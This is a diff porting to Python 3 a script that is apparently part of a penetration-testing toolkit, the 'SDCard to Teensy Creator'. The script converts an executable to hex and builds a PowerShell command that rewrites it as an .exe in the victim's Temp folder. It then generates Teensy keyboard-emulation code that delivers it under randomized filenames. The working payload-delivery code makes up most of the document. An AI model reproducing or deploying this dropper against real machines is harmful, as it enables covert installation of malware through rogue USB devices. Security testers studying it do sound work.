@@ -1,23 +1,30 @@
 #!/usr/bin/python
-import binascii,base64,sys,os,random,string,subprocess,socket
+import binascii
+import base64
+import sys
+import os
+import random
+import string
+import subprocess
+import socket
 from src.core.setcore import *
 from src.core.dictionaries import *
 from src.core.menu.text import *
 
-################################################################################################
+##########################################################################
 #
 #                            BSIDES LV SDCARD to Teensy Creator
 #
 #                                by Josh Kelley (@winfang98)
 #                                Dave Kennedy (@hackingdave)
 #
-################################################################################################
+##########################################################################
 
-################################################################################################
-################################################################################################
+##########################################################################
+##########################################################################
 
 # print main stuff for the application
-print """
+print("""
 ********************************************************************
         BSIDES Las Vegas ----  SDCard to Teensy Creator
 ********************************************************************
@@ -31,48 +38,55 @@ file that this tool outputs in order to successfully complete the task.
 
 It works by reading natively off the SDCard into a buffer space thats then
 written out through the keyboard.
-"""
+""")
 
 # if we hit here we are good since msfvenom is installed
-print """
+print("""
         .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
         |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
         `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
-                                                   enabled.\n"""
+                                                   enabled.\n""")
 
 # grab the path and filename from user
-path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
+path = input(
+    setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
 if not os.path.isfile(path):
     while 1:
         print_warning("Filename not found, try again")
-        path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
-        if os.path.isfile(path): break
+        path = input(
+            setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
+        if os.path.isfile(path):
+            break
 
-print_warning("Note: This will only deliver the payload, you are in charge of creating the listener if applicable.")
-print_status("Converting the executable to a hexadecimal form to be converted later...")
+print_warning(
+    "Note: This will only deliver the payload, you are in charge of creating the listener if applicable.")
+print_status(
+    "Converting the executable to a hexadecimal form to be converted later...")
 
-fileopen = file(path, "rb")
+fileopen = open(path, "rb")
 data = fileopen.read()
 data = binascii.hexlify(data)
-filewrite = file("converts.txt", "w")
+filewrite = open("converts.txt", "w")
 filewrite.write(data)
-print "[*] File converted successfully. It has been expored in the working directory under 'converts.txt'. Copy this one file to the teensy SDCard."
+print("[*] File converted successfully. It has been expored in the working directory under 'converts.txt'. Copy this one file to the teensy SDCard.")
 
 
 output_variable = "/*\nTeensy Hex to File SDCard Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)\nReading from a SD card.  Based on code from: http://arduino.cc/en/Tutorial/DumpFile\n*/\n\n"
 
 # this is used to write out the file
-random_filename = generate_random_string(8,15) + ".txt"
+random_filename = generate_random_string(8, 15) + ".txt"
 
-# powershell command here, needs to be unicoded then base64 in order to use encodedcommand
-powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))
+# powershell command here, needs to be unicoded then base64 in order to
+# use encodedcommand
+powershell_command = str(
+    "$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename, random_filename))
 
-########################################################################################################################################################################################################
+##########################################################################
 #
 # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
 # in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
 #
-########################################################################################################################################################################################################
+##########################################################################
 
 # blank command will store our fixed unicode variable
 blank_command = ""
@@ -87,9 +101,9 @@ powershell_command = blank_command
 powershell_command = base64.b64encode(powershell_command)
 
 # vbs filename
-vbs = generate_random_string(10,15) + ".vbs"
+vbs = generate_random_string(10, 15) + ".vbs"
 # .batch filename
-bat = generate_random_string(10,15) + ".bat"
+bat = generate_random_string(10, 15) + ".bat"
 
 # write the rest of the teensy code
 output_variable += ("""
@@ -210,17 +224,18 @@ Keyboard.send_now();
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }
-""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,bat,vbs))
+""" % (random_filename, random_filename, powershell_command, vbs, bat, vbs, vbs, random_filename, bat, vbs))
 # delete temporary file
-subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
-print "[*] Binary to Teensy file exported as teensy.pde"
+subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" %
+                 (random_filename), shell=True).wait()
+print("[*] Binary to Teensy file exported as teensy.pde")
 # write the teensy.pde file out
-filewrite = file("teensy.pde", "w")
+filewrite = open("teensy.pde", "w")
 # write the teensy.pde file out
 filewrite.write(output_variable)
 # close the file
 filewrite.close()
-print """
+print("""
 
 Instructions:
 
@@ -230,5 +245,5 @@ some code marked above based on the Teensy and the Teensy++ based on how you sol
 on.
 
 Happy hacking.
-"""
+""")
 return_continue()
